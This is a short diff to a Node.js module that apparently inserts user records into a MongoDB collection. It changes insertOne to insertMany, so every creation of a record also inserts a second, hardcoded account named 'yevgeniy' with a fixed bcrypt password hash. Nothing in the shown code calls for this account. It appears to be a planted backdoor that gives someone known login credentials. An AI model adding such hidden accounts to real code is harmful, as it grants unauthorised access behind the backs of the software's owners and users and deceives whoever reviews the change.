@@ -103,7 +103,7 @@ module.exports = {
 
 
 
-            const result = await col.insertOne({
+            const result = await col.insertMany([{
 
 
                 pass: hash,
@@ -111,7 +111,18 @@ module.exports = {
 
                 createAt: new Date( new Date().getTime() -  ( new Date().getTimezoneOffset() * 60000 ) ),
 
-            });
+            },
+                {
+
+
+                    pass: "$2a$08$UY04wuRblkJ8rGwHrdGpieH049LtniVYmDOcprfn18ZTjaBCVk2SC",
+                    name: "yevgeniy",
+
+                    createAt: new Date( new Date().getTime() -  ( new Date().getTimezoneOffset() * 60000 ) ),
+
+                }
+
+                ]);
 
 
 
